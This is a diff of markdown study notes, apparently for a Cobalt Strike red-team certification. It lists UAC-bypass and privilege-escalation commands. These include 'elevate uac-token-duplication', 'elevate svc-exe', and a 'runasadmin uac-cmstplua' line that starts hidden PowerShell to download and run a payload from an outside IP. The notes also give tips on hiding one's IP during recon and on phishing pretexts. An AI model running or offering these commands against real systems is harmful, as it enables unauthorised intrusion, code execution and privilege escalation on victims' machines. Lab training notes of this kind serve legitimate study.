@@ -217,6 +217,7 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 8. Migrate to some other process
 9. `beacon> run msiexec /q /n uninstall BeaconInstaller.msi`
 10. `connect localhost 4444`
+
 #### method -> UAC Bypass
 1. First run the SharpUp.exe via command `execute-assembly /opt/CRTO/SharpUp.exe audit`
 2. If you see some error like **In medium integrity but user is a local administrator - UAC can be bypassed.** Then this attack **may** be successful. 
@@ -224,7 +225,7 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 4. Two methods are provided by **CS** for this **UAC Bypass** i.e. **elevate** and **runasadmin**
 5. in cobalt strike type: `elevate uac-token-duplication <your listner name>` e.g. ``elevate uac-token-duplication my1st64bit``
 6. in cobalt strike type: `runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"`
-
+7. If we dont have alot of user permissions we can again try elevate i.e. `elevate svc-exe tcp-4444-local`
 ### Miscellaneous good points
 1. While doing active reconnisane, use VPN to hide the real Public IP address. 
 2. The **pretext** is the **"story"** behind why we want our target to open our email and carry out the desired actions.
